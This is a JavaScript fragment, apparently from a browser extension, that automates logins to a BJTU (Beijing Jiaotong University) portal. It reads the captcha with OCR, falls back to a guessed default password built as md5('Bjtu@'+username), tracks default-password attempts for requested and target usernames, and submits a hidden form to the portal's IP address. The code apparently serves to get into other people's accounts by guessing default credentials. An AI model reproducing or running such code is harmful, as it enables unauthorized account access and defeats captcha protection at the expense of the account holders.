            <div><b>验证码：</b>${recognizedCode || passcode || '-'}</div>
            <div><b>置信度：</b>${confidenceText}</div>
          </div>
        </div>
        <div style="display:flex;justify-content:flex-end;margin-top:10px;">
          <button id="__bjtu_cancel_submit__" style="padding:6px 12px;border:1px solid #cbd5e1;background:#fff;border-radius:6px;cursor:pointer;">取消</button>
        </div>
        <style>@keyframes __bjtu_spin{to{transform:rotate(360deg)}}</style>
      </div>
    `;
    root.appendChild(amask);
    const cancelSubmit = await new Promise((resolve) => {
      const t = setTimeout(() => resolve(false), 700);
      const btnCancel = amask.querySelector('#__bjtu_cancel_submit__');
      if (btnCancel) {
        btnCancel.addEventListener('click', () => {
          clearTimeout(t);
          resolve(true);
        }, { once: true });
      }
    });
    if (cancelSubmit) {
      flowState.forceRetry = false;
      writeFlowState(flowState);
      try { sessionStorage.setItem(SUPPRESS_AUTO_START_ONCE_KEY, '1'); } catch {}
      try { amask.remove(); } catch {}
      return { ok: false, reason: 'back-to-input' };
    }
  }

  if (!username) return { ok: false, reason: 'empty-username' };
  if (!passcode) {
    const ocrRes = await autoRecognizeCaptchaCode();
    passcode = String(ocrRes?.code || '').trim();
  }
  if (!passcode) return { ok: false, reason: 'empty-passcode' };
  if (!passwordMd5) passwordMd5 = md5(`Bjtu@${username}`);

  try {
    const usingDefaultForOriginal = !!(
      fromExtension
      && originalRequestedUsername
      && originalRequestedUsername !== '8888'
      && username === originalRequestedUsername
      && passwordMd5 === md5(`Bjtu@${originalRequestedUsername}`)
    );
    if (usingDefaultForOriginal) {
      sessionStorage.setItem(LAST_DEFAULT_TRY_USER_KEY, originalRequestedUsername);
    } else {
      sessionStorage.removeItem(LAST_DEFAULT_TRY_USER_KEY);
    }
    sessionStorage.setItem(LAST_LOGIN_USERNAME_KEY, username);
  } catch {}

  await new Promise(r => setTimeout(r, 150));

  const form = document.createElement('form');
  form.method = 'POST';
  form.action = 'http://123.121.147.7:88/ve/s.shtml';
  form.style.display = 'none';
  const add = (k, v) => {
    const i = document.createElement('input');
    i.type = 'hidden'; i.name = k; i.value = v; form.appendChild(i);
  };
  add('login', 'main_2');
  add('qxkt_type', '');
  add('qxkt_url', '');
  add('username', username);
  add('password', passwordMd5);
  add('passcode', passcode);
  root.appendChild(form);
  form.submit();

  flowState.currentUsername = username;
  if (username === '8888') flowState.useAux = true;
  flowState.retryCount = 0;
  writeFlowState(flowState);

  return {
    ok: true,
    pendingSwitch: pendingSwitchTarget
      ? { targetUsername: pendingSwitchTarget, ts: Date.now() }
      : null
  };
}